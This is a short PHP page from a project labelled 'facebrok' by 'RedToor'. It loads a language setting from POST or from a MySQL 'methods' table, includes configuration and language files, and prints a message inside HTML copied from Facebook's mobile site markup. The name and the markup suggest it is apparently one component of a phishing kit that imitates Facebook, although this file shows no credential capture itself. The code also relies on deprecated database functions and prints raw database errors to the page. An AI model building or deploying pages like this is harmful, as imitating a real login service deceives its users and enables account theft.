<?php
// RedToor
// Project facebrok
error_reporting(0);
// Language--------------------------------
$lang=$_POST['idio'];
if ($lang=='')
{ 
// Connections ----------------------
if (file_exists("../croak/install/install.php")) {header("location:../croak/install/");} 
include("../croak/config.php");
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
//-----------------------------------
// Check URL 
$sql=mysql_query("SELECT * FROM methods WHERE id=3") or die('Failed in Consult: '.mysql_error());
$row=mysql_fetch_array($sql);
$lang=''.$row['value'].''; 
// -- END --
} else {$lang=$lang;}
// Languages------------------------------
include("../lang.php")
//----------------------------------------
?>
<?php include("head.php");           // ---   SKY   ?>
<div class="_55wr acr apm abb" data-sigil="marea"><span class="mfsm"><?php echo"$me"?></span></div>
<div class="acw apm" data-sigil="marea"><span class="mfss fcg"><a class="sec" href="../m"><?php echo"$mf"?></a></span></div>